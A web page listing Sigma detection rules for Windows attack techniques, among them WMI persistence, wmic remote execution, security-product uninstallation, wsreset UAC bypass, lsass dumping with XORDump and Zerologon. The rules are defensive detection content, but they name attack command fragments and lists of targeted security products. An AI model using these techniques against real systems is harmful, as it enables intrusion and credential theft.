<li><a href="#">title:WMI Modules Loaded id: 671bb7e3-a020-4824-a00e-2ee5b55f385e description: Detects non wmiprvse loading WMI modules status: experimental date: 2019/08/10 modified: 2022/01/12 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1047 logsource: category: image_load product: windows detection: selection: ImageLoaded|endswith: - '\wmiclnt.dll' - '\WmiApRpl.dll' - '\wmiprov.dll' - '\wmiutils.dll' - '\wbemcomn.dll' - '\wbemprox.dll' - '\WMINet_Utils.dll' - '\wbemsvc.dll' - '\fastprox.dll' filter: Image|endswith: - '\WmiPrvSE.exe' - '\WmiApSrv.exe' - '\svchost.exe' - '\DeviceCensus.exe' - '\CompatTelRunner.exe' - '\sdiagnhost.exe' - '\SIHClient.exe' - '\ngentask.exe' # c:\Windows\Microsoft.NET\Framework(64)\ngentask.exe - '\windows\system32\taskhostw.exe' # c:\windows\system32\taskhostw.exe - '\windows\system32\MoUsoCoreWorker.exe' # c:\windows\System32\MoUsoCoreWorker.exe on win10 20H04 at least - '\windows\system32\wbem\WMIADAP.exe' # - 'C:\Windows\Sysmon64.exe' - 'C:\Windows\Sysmon.exe' - 'C:\Windows\System32\wbem\unsecapp.exe' - '\logman.exe' - '\systeminfo.exe' - '\nvcontainer.exe' - 'C:\Windows\System32\wbem\WMIC.exe' - '\explorer.exe' - '\opera_autoupdate.exe' - '\MsMpEng.exe' - '\thor64.exe' - '\thor.exe' filter_generic: # rule caused many false positives in different productive environments - using this filter to exclude all programs that run from folders that only the administrative groups should have access to Image|startswith: - 'C:\Program Files\' - 'C:\Program Files (x86)\' condition: selection and not filter and not filter_generic fields: - ComputerName - User - Image - ImageLoaded falsepositives: - Unknown level: informational # too many false positives 
<li><a href="#">title:WMI Persistence - Command Line Event Consumer id: 05936ce2-ee05-4dae-9d03-9a391cf2d2c6 status: test description: Detects WMI command line event consumers author: Thomas Patzke references: - date: 2018/03/07 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image: 'C:\Windows\System32\wbem\WmiPrvSE.exe' ImageLoaded|endswith: '\wbemcons.dll' condition: selection falsepositives: - Unknown (data set is too small; further testing needed) level: high tags: - attack.t1546.003 - attack.persistence 
<li><a href="#">title:WMI Persistence - Script Event Consumer File Write id: 33f41cdd-35ac-4ba8-814b-c6a4244a1ad4 status: test description: Detects file writes of WMI script event consumer author: Thomas Patzke references: - date: 2018/03/07 modified: 2021/11/27 logsource: product: windows category: file_event detection: selection: Image: 'C:\WINDOWS\system32\wbem\scrcons.exe' condition: selection falsepositives: - Dell Power Manager (C:\Program Files\Dell\PowerManager\DpmPowerPlanSetup.exe) level: high tags: - attack.t1546.003 - attack.persistence 
<li><a href="#">title:WMI Persistence - Script Event Consumer id: ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e status: test description: Detects WMI script event consumers author: Thomas Patzke references: - date: 2018/03/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image: C:\WINDOWS\system32\wbem\scrcons.exe ParentImage: C:\Windows\System32\svchost.exe condition: selection falsepositives: - Legitimate event consumers level: high tags: - attack.persistence - attack.privilege_escalation - attack.t1546.003 
<li><a href="#">title:WMI Persistence id: 0b7889b4-5577-4521-a60a-3376ee7f9f7b status: experimental description: Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs. author: Florian Roth, Gleb Sukhodolskiy, Timur Zinniatullin oscd.community date: 2017/08/22 modified: 2022/02/10 references: - - tags: - attack.persistence - attack.privilege_escalation - attack.t1546.003 logsource: product: windows service: wmi #native windows detection definition: 'WMI Namespaces Auditing and SACL should be configured, EventID 5861 and 5859 detection requires Windows 10, 2012 and higher' detection: wmi_filter_to_consumer_binding: EventID: 5861 consumer_keywords: - 'ActiveScriptEventConsumer' - 'CommandLineEventConsumer' - 'CommandLineTemplate' # - 'Binding EventFilter' # too many false positive with HP Health Driver wmi_filter_registration: EventID: 5859 filter_scmevent: Provider: 'SCM Event Provider' Query: 'select * from MSFT_SCMEventLogEvent' User: 'S-1-5-32-544' PossibleCause: 'Permanent' condition: ( (wmi_filter_to_consumer_binding and consumer_keywords) or (wmi_filter_registration) ) and not filter_scmevent falsepositives: - Unknown (data set is too small; further testing needed) level: medium 
<li><a href="#">title:WMI Persistence id: f033f3f3-fd24-4995-97d8-a3bb17550a88 related: - id: 0b7889b4-5577-4521-a60a-3376ee7f9f7b type: derived status: experimental description: Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs. author: Florian Roth, Gleb Sukhodolskiy, Timur Zinniatullin oscd.community date: 2017/08/22 modified: 2021/09/21 references: - - tags: - attack.persistence - attack.privilege_escalation - attack.t1546.003 logsource: product: windows service: security detection: selection: EventID: 4662 ObjectType: 'WMI Namespace' ObjectName|contains: 'subscription' condition: selection falsepositives: - Unknown (data set is too small; further testing needed) level: medium 
<li><a href="#">title:WMI Reconnaissance List Remote Services id: 09af397b-c5eb-4811-b2bb-08b3de464ebf status: experimental description: | An adversary might use WMI to check if a certain Remote Service is running on a remote device. When the test completes, a service information will be displayed on the screen if it exists. A common feedback message is that "No instance(s) Available" if the service queried is not running. A common error message is "Node - (provided IP or default) ERROR Description =The RPC server is unavailable" if the provided remote host is unreacheable author: frack113 references: - - date: 2022/01/01 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: \WMIC.exe - OriginalFileName: 'wmic.exe' selection_cli: CommandLine|contains|all: - '/node:' - service condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:WMI Remote Command Execution id: e42af9df-d90b-4306-b7fb-05c863847ebd status: experimental description: An adversary might use WMI to execute commands on a remote system author: frack113 references: - - date: 2022/03/13 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: \WMIC.exe - OriginalFileName: 'wmic.exe' selection_cli: CommandLine|contains|all: - '/node:' - process - call - create condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:WMI Script Host Process Image Loaded id: b439f47d-ef52-4b29-9a2f-57d8a96cb6b8 status: test description: Detects signs of the WMI script host process %SystemRoot%\system32\wbem\scrcons.exe functionality being used via images being loaded by a process. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - date: 2020/09/02 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: '\scrcons.exe' ImageLoaded|endswith: - '\vbscript.dll' - '\wbemdisp.dll' - '\wshom.ocx' - '\scrrun.dll' condition: selection falsepositives: - Unknown level: high tags: - attack.lateral_movement - attack.privilege_escalation - attack.persistence - attack.t1546.003 
<li><a href="#">title:WMI Spawning Windows PowerShell id: 692f0bec-83ba-4d04-af7e-e884a96059b6 status: experimental description: Detects WMI spawning PowerShell references: - - author: Markus Neis / @Karneades date: 2019/04/03 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_parent: ParentImage|endswith: '\wmiprvse.exe' selection_img: - Image|endswith: '\powershell.exe' - OriginalFileName: 'PowerShell.EXE' filter_null1: CommandLine: 'null' filter_null2: # some backends need the null value in a separate expression CommandLine: null condition: all of selection* and not filter_null1 and not filter_null2 falsepositives: - AppvClient - CCM level: high tags: - attack.execution - attack.t1047 - attack.t1059.001 
<li><a href="#">title:WMI Uninstall An Application id: b53317a0-8acf-4fd1-8de8-a5401e776b96 status: experimental description: Uninstall an application with wmic author: frac113 references: - date: 2022/01/28 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: \WMIC.exe - OriginalFileName: 'wmic.exe' selection_cli: CommandLine|contains: call uninstall condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:WMIC Hotfix Recon id: dfd2fcb7-8bd5-4daa-b132-5adb61d6ad45 status: experimental description: Detects wmic known recon method to look for installed hotfixes, often used by pentest and attackers enum scripts author: Nasreddine Bencherchali references: - - date: 2022/06/20 logsource: category: process_creation product: windows detection: selection_img: - OriginalFileName: 'wmic.exe' - Image|endswith: '\WMIC.exe' selection_cli: CommandLine|contains|all: - ' qfe ' - ' get ' - 'Caption,Description,HotFixID,InstalledOn' condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:WMIC Loading Scripting Libraries id: 06ce37c2-61ab-4f05-9ff5-b1a96d18ae32 status: test description: Detects threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc). author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - date: 2020/10/17 modified: 2021/11/27 logsource: category: image_load product: windows detection: selection: Image|endswith: '\wmic.exe' ImageLoaded|endswith: - '\jscript.dll' - '\vbscript.dll' condition: selection falsepositives: - Apparently, wmic os get lastboottuptime loads vbscript.dll level: high tags: - attack.defense_evasion - attack.t1220 
<li><a href="#">title:WMIC Service Start/Stop id: 0b7163dc-7eee-4960-af17-c0cd517f92da status: experimental description: Detects usage of wmic to start or stop a service author: Nasreddine Bencherchali references: - date: 2022/06/20 logsource: category: process_creation product: windows detection: selection_img: - OriginalFileName: 'wmic.exe' - Image|endswith: '\WMIC.exe' selection_cli: CommandLine|contains|all: - ' service ' - ' call ' CommandLine|contains: - 'stopservice' - 'startservice' condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:Wmic Uninstall Security Product id: 847d5ff3-8a31-4737-a970-aeae8fe21765 description: Detects deinstallation of security products using WMIC utility references: - - - date: 2021/01/30 modified: 2022/06/03 status: experimental author: Florian Roth, Nasreddine Bencherchali tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection_cli: CommandLine|contains|all: - 'wmic' - 'product where ' - 'call uninstall' - '/nointeractive' CommandLine|contains: - ' name=' - 'caption like ' selection_product: CommandLine|contains: - 'Antivirus' - 'AVG ' - 'Crowdstrike Sensor' - 'DLP Endpoint' - 'Endpoint Detection' - 'Endpoint Protection' - 'Endpoint Security' - 'Endpoint Sensor' - 'ESET File Security' - 'Malwarebytes' - 'McAfee Agent' - 'Microsoft Security Client' - 'Threat Protection' - 'VirusScan' - 'Webroot SecureAnywhere' - 'Windows Defender' - 'CarbonBlack' - 'Carbon Black' - 'Cb Defense Sensor 64-bit' - 'Dell Threat Defense' - 'Cylance ' - 'LogRhythm System Monitor Service' condition: all of selection* falsepositives: - Legitimate administration level: medium 
<li><a href="#">title:WMIC Unquoted Services Path Lookup id: 68bcd73b-37ef-49cb-95fc-edc809730be6 status: experimental description: Detects wmic known recon method to look for unquoted serivce paths, often used by pentest and attackers enum scripts author: Nasreddine Bencherchali references: - - date: 2022/06/20 logsource: category: process_creation product: windows detection: selection_img: - OriginalFileName: 'wmic.exe' - Image|endswith: '\WMIC.exe' selection_cli: CommandLine|contains|all: - ' service ' - ' get ' CommandLine|contains: - name - displayname - pathname - startmode condition: all of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1047 
<li><a href="#">title:WMIExec VBS Script id: 966e4016-627f-44f7-8341-f394905c361f status: test description: Detects suspicious file execution by wscript and cscript author: Florian Roth references: - date: 2017/04/07 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\cscript.exe' CommandLine|contains|all: - '.vbs' - '/shell' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: high tags: - attack.execution - attack.g0045 - attack.t1059.005 
<li><a href="#">title:WMImplant Hack Tool id: 8028c2c3-e25a-46e3-827f-bbb5abf181d7 status: experimental description: Detects parameters used by WMImplant references: - tags: - attack.execution - attack.t1047 - attack.t1059.001 author: NVISO date: 2020/03/26 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'WMImplant' - ' change_user ' - ' gen_cli ' - ' command_exec ' - ' disable_wdigest ' - ' disable_winrm ' - ' enable_wdigest ' - ' enable_winrm ' - ' registry_mod ' - ' remote_posh ' - ' sched_job ' - ' service_mod ' - ' process_kill ' # - ' process_start ' - ' active_users ' - ' basic_info ' # - ' drive_list ' # - ' installed_programs ' - ' power_off ' - ' vacant_system ' - ' logon_events ' condition: selection falsepositives: - Administrative scripts that use the same keywords. level: high 
<li><a href="#">title:Wmiprvse Spawning Process id: d21374ff-f574-44a7-9998-4a8c8bf33d7d description: Detects wmiprvse spawning processes status: experimental date: 2019/08/15 modified: 2022/05/27 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1047 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\WmiPrvSe.exe' filter: - LogonId: - '0x3e7' # LUID 999 for SYSTEM - 'null' # too many false positives - User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' - Image|endswith: - '\WmiPrvSE.exe' - '\WerFault.exe' filter_null: # some backends need the null value in a separate expression LogonId: null condition: selection and not filter and not filter_null falsepositives: - Unknown level: high 
<li><a href="#">title:Wmiprvse Wbemcomn DLL Hijack id: 614a7e17-5643-4d89-b6fe-f9df1a79641c description: Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI DLL Hijack scenario. status: experimental date: 2020/10/12 modified: 2021/09/09 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.002 references: - logsource: product: windows category: file_event detection: selection: Image: System TargetFilename|endswith: '\wbem\wbemcomn.dll' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:Wmiprvse Wbemcomn DLL Hijack id: 7707a579-e0d8-4886-a853-ce47e4575aaa description: Detects a threat actor creating a file named `wbemcomn.dll` in the `C:\Windows\System32\wbem\` directory over the network and loading it for a WMI DLL Hijack scenario. status: experimental date: 2020/10/12 modified: 2021/09/09 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.execution - attack.t1047 - attack.lateral_movement - attack.t1021.002 references: - logsource: product: windows category: image_load detection: selection: Image|endswith: '\wmiprvse.exe' ImageLoaded|endswith: '\wbem\wbemcomn.dll' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Wow6432Node Classes Autorun Keys Modification id: 18f2065c-d36c-464a-a748-bcf909acb2e3 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: wow_classes_base: EventType: SetValue TargetObject|contains: '\Software\Wow6432Node\Classes' wow_classes: TargetObject|contains: - '\Folder\ShellEx\ExtShellFolderViews' - '\Folder\ShellEx\DragDropHandlers' - '\Folder\ShellEx\ColumnHandlers' - '\Directory\Shellex\DragDropHandlers' - '\Directory\Shellex\CopyHookHandlers' - '\CLSID\{AC757296-3522-4E11-9862-C17BE5A1767E}\Instance' - '\CLSID\{ABE3B9A4-257D-4B97-BD1A-294AF496222E}\Instance' - '\CLSID\{7ED96837-96F0-4812-B211-F13C24117ED3}\Instance' - '\CLSID\{083863F1-70DE-11d0-BD40-00A0C911CE86}\Instance' - '\AllFileSystemObjects\ShellEx\DragDropHandlers' - '\ShellEx\PropertySheetHandlers' - '\ShellEx\ContextMenuHandlers' filter: Details: '(Empty)' condition: wow_classes_base and wow_classes and not filter fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Wow6432Node CurrentVersion Autorun Keys Modification id: 480421f9-417f-4d3b-9552-fd2728443ec8 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/03/26 logsource: category: registry_set product: windows detection: wow_nt_current_version_base: EventType: SetValue TargetObject|contains: '\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion' wow_nt_current_version: TargetObject|contains: - '\Windows\Appinit_Dlls' - '\Image File Execution Options' - '\Drivers32' filter: Details: - '(Empty)' - '\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' condition: wow_nt_current_version_base and wow_nt_current_version and not filter fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Wow6432Node CurrentVersion Autorun Keys Modification id: b29aed60-ebd1-442b-9cb5-16a1d0324adb related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/04/04 logsource: category: registry_set product: windows detection: wow_current_version_base: EventType: SetValue TargetObject|contains: '\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion' wow_current_version: TargetObject|contains: - '\ShellServiceObjectDelayLoad' - '\Run\' - '\RunOnce\' - '\Explorer\ShellServiceObjects' - '\Explorer\ShellIconOverlayIdentifiers' - '\Explorer\ShellExecuteHooks' - '\Explorer\SharedTaskScheduler' - '\Explorer\Browser Helper Objects' filter_empty: Details: '(Empty)' filter_edge: Image|contains|all: - 'C:\Program Files (x86)\Microsoft\EdgeUpdate\Install\{' - '\setup.exe' filter_msoffice1: Image: 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe' TargetObject|contains: '\Office\ClickToRun\REGISTRY\MACHINE\Software\Wow6432Node\' filter_msoffice2: Image: - 'C:\Program Files\Microsoft Office\root\integration\integrator.exe' - 'C:\Program Files (x86)\Microsoft Office\root\integration\integrator.exe' TargetObject|contains: '\Explorer\Browser Helper Objects\{31D09BA0-12F5-4CCE-BE8A-2923E76605DA}\' filter_dropbox: - Details|endswith: '-A251-47B7-93E1-CDD82E34AF8B}' - Details: 'grpconv -o' - Details|contains|all: - 'C:\Program Files' - '\Dropbox\Client\Dropbox.exe' - ' /systemstartup' filter_evernote: TargetObject|endswith: '\Explorer\Browser Helper Objects\{92EF2EAD-A7CE-4424-B0DB-499CF856608E}\NoExplorer' filter_dotnet: Image|contains: '\windowsdesktop-runtime-' TargetObject|endswith: - '\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\{e2d1ae32-dd1d-4ad7-a298-10e42e7840fc}' - '\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\{7037b699-7382-448c-89a7-4765961d2537}' Details|startswith: - '"C:\ProgramData\Package Cache\{7037b699-7382-448c-89a7-4765961d2537}\windowsdesktop-runtime-' - '"C:\ProgramData\Package Cache\{e2d1ae32-dd1d-4ad7-a298-10e42e7840fc}\windowsdesktop-runtime-' Details|endswith: '.exe" /burn.runonce' filter_office: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' filter_ms_win_desktop_runtime: Details|startswith: '"C:\ProgramData\Package Cache\{d21a4f20-968a-4b0c-bf04-a38da5f06e41}\windowsdesktop-runtime-' condition: wow_current_version_base and wow_current_version and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Write Protect For Storage Disabled id: 75f7a0e2-7154-4c4d-9eae-5cdb4e0a5c13 description: Looks for changes to registry to disable any write-protect property for storage devices. This could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group. status: experimental author: Sreeman date: 2021/06/11 modified: 2022/03/07 logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - 'reg add' - 'hklm\system\currentcontrolset\control' - 'write protection' - '0' CommandLine|contains: - 'storage' - 'storagedevicepolicies' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1562 
<li><a href="#">title:Writing Local Admin Share id: 4aafb0fa-bff5-4b9d-b99e-8093e659c65f status: experimental description: | Aversaries may use to interact with a remote network share using Server Message Block (SMB). This technique is used by post-exploitation frameworks. author: frack113 references: - date: 2022/01/01 logsource: product: windows category: file_event detection: selection: TargetFilename|contains|all: - '\\127.0.0' - '\ADMIN$\' condition: selection falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.t1546.002 
<li><a href="#">title:Writing Of Malicious Files To The Fonts Folder id: ae9b0bd7-8888-4606-b444-0ed7410cb728 description: Monitors for the hiding possible malicious files in the C:\Windows\Fonts\ location. This folder doesn't require admin privillege to be written and executed from. status: experimental references: - date: 2020/04/21 modified: 2022/03/08 author: Sreeman logsource: product: windows category: process_creation detection: selection_1: CommandLine|contains: - 'echo' - 'copy' - 'type' - 'file createnew' - 'cacls' selection_2: CommandLine|contains: 'C:\Windows\Fonts\' selection_3: CommandLine|contains: - '.sh' - '.exe' - '.dll' - '.bin' - '.bat' - '.cmd' - '.js' - '.msh' - '.reg' - '.scr' - '.ps' - '.vb' - '.jar' - '.pl' - '.inf' - '.cpl' - '.hta' - '.msi' - '.vbs' condition: all of selection_* fields: - CommandLine - ParentProcess - CommandLine falsepositives: - Unknown level: medium tags: - attack.t1211 - attack.t1059 - attack.defense_evasion - attack.persistence 
<li><a href="#">title:WScript or CScript Dropper id: 002bdb95-0cf1-46a6-9e08-d38c128a6127 status: experimental description: Detects a file ending in jse, vbe, js, vba, vbs written by cscript.exe or wscript.exe related: - id: cea72823-df4d-4567-950c-0b579eaf0846 type: derived references: - WScript or CScript Dropper (cea72823-df4d-4567-950c-0b579eaf0846) author: Tim Shelton date: 2022/01/10 modified: 2022/01/11 logsource: category: file_event product: windows detection: selection: Image|endswith: - '\wscript.exe' - '\cscript.exe' TargetFilename|startswith: - 'C:\Users\' - 'C:\ProgramData' TargetFilename|endswith: - '.jse' - '.vbe' - '.js' - '.vba' - '.vbs' condition: selection fields: - Image - TargetFilename falsepositives: - Unknown level: high 
<li><a href="#">title:WScript or CScript Dropper id: cea72823-df4d-4567-950c-0b579eaf0846 status: test description: Detects wscript/cscript executions of scripts located in user directories author: Margaritis Dimitrios (idea), Florian Roth (rule), oscd.community date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - '\wscript.exe' - '\cscript.exe' CommandLine|contains: - 'C:\Users\' - 'C:\ProgramData\' selection2: CommandLine|contains: - '.jse' - '.vbe' - '.js' - '.vba' - '.vbs' falsepositive: ParentImage|contains: '\winzip' condition: selection1 and selection2 and not falsepositive fields: - CommandLine - ParentCommandLine falsepositives: - Winzip - Other self-extractors level: high tags: - attack.execution - attack.t1059.005 - attack.t1059.007 
<li><a href="#">title:WSF/JSE/JS/VBA/VBE File Execution id: 1e33157c-53b1-41ad-bbcc-780b80b58288 status: test description: Detects suspicious file execution by wscript and cscript author: Michael Haag date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - '\wscript.exe' - '\cscript.exe' CommandLine|contains: - '.jse' - '.vbe' - '.js' - '.vba' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Will need to be tuned. I recommend adding the user profile path in CommandLine if it is getting too noisy. level: medium tags: - attack.execution - attack.t1059.005 - attack.t1059.007 
<li><a href="#">title:WSL Execution id: dec44ca7-61ad-493c-bfd7-8819c5faa09b status: test description: Detects Possible usage of Windows Subsystem for Linux (WSL) binary as a LOLBIN author: 'oscd.community, Zach Stanford @svch0st, Nasreddine Bencherchali' references: - - date: 2020/10/05 modified: 2022/06/11 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\wsl.exe' - OriginalFileName: 'wsl.exe' selection_cli: CommandLine|contains: - ' -e ' - ' --exec ' - ' --system ' - ' /mnt/c' # Path to mounted "C:\" partition (Indication of running Windows binaries via WSL) condition: all of selection* falsepositives: - Automation and orchestration scripts may use this method execute scripts etc level: medium tags: - attack.execution - attack.defense_evasion - attack.t1218 - attack.t1202 
<li><a href="#">title:Wsreset UAC Bypass id: bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae status: test description: Detects a method that uses Wsreset.exe tool that can be used to reset the Windows Store to bypass UAC author: Florian Roth references: - - - date: 2020/01/30 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\WSreset.exe' condition: selection fields: - CommandLine falsepositives: - Unknown sub processes of Wsreset.exe level: high tags: - attack.privilege_escalation - attack.defense_evasion - attack.t1548.002 
<li><a href="#">title:Wuauclt Network Connection id: c649a6c7-cd8c-4a78-9c04-000fc76df954 status: test description: Detects the use of the Windows Update Client binary (wuauclt.exe) to proxy execute code and making a network connections. One could easily make the DLL spawn a new process and inject to it to proxy the network connection and bypass this rule. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - date: 2020/10/12 modified: 2021/11/27 logsource: category: network_connection product: windows detection: selection: Image|contains: wuauclt condition: selection falsepositives: - Legitimate use of wuauclt.exe over the network. level: medium tags: - attack.defense_evasion - attack.t1218 
<li><a href="#">title:XORDump Use id: 66e563f9-1cbd-4a22-a957-d8b7c0f44372 description: Detects suspicious use of XORDump process memory dumping utility status: experimental references: - author: Florian Roth date: 2022/01/28 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\xordump.exe' - CommandLine|contains: - ' -process lsass.exe ' - ' -m comsvcs ' - ' -m dbghelp ' - ' -m dbgcore ' condition: selection falsepositives: - Another tool that uses the command line switches of XORdump level: high 
<li><a href="#">title:XSL Script Processing id: 05c36dd6-79d6-4a9a-97da-3db20298ab2d status: test description: Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. Rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. author: Timur Zinniatullin, oscd.community references: - date: 2019/10/21 modified: 2021/11/29 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\wmic.exe' CommandLine|contains: '/format' # wmic process list /FORMAT /? - Image|endswith: '\msxsl.exe' false_positives: CommandLine|contains: - '/Format:List' - '/Format:htable' - '/Format:hform' - '/Format:table' - '/Format:mof' - '/Format:value' - '/Format:rawxml' - '/Format:xml' - '/Format:csv' condition: selection and not false_positives falsepositives: - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment. - Msxsl.exe is not installed by default, so unlikely. - Static format arguments - level: medium tags: - attack.defense_evasion - attack.t1220 
<li><a href="#">title:Xwizard DLL Sideloading id: 193d5ccd-6f59-40c6-b5b0-8e32d5ddd3d1 status: experimental description: Detects the execution of Xwizard tool from the non-default directory which can be used to sideload a custom xwizards.dll references: - - author: Christian Burkard date: 2021/09/20 tags: - attack.defense_evasion - attack.t1574.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\xwizard.exe' filter: Image|startswith: 'C:\Windows\System32\' condition: selection and not filter falsepositives: - Windows installed on non-C drive level: high 
<li><a href="#">title:Zerologon Exploitation Using Well-known Tools id: 18f37338-b9bd-4117-a039-280c81f7a596 status: stable description: This rule is designed to detect attempts to exploit Zerologon (CVE-2020-1472) vulnerability using mimikatz zerologon module or other exploits from machine with "kali" hostname. references: - - author: 'Demyan Sokolin @_drd0c, Teymur Kheirkhabarov @HeirhabarovT, oscd.community' date: 2020/10/13 modified: 2021/05/30 tags: - attack.t1210 - attack.lateral_movement logsource: service: system product: windows detection: selection: EventID: - 5805 - 5723 keywords: - kali - mimikatz condition: selection and keywords level: critical 
<li><a href="#">title:Zip A Folder With PowerShell For Staging In Temp id: 71ff406e-b633-4989-96ec-bc49d825a412 related: - id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9 type: derived status: experimental author: frack113 date: 2021/07/20 modified: 2021/09/07 description: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration references: - tags: - attack.collection - attack.t1074.001 logsource: product: windows service: powershell-classic definition: fields have to be extract from event detection: selection: HostApplication|contains|all: - 'Compress-Archive ' - ' -Path ' - ' -DestinationPath ' - '$env:TEMP\' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Zip A Folder With PowerShell For Staging In Temp id: 85a8e5ba-bd03-4bfb-bbfa-a4409a8f8b98 related: - id: b7a3c9a3-09ea-4934-8864-6a32cacd98d9 type: derived status: experimental author: frack113 date: 2021/07/20 modified: 2021/09/07 description: Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration references: - tags: - attack.collection - attack.t1074.001 logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - 'Compress-Archive ' - ' -Path ' - ' -DestinationPath ' - '$env:TEMP\' condition: selection falsepositives: - Unknown level: medium 
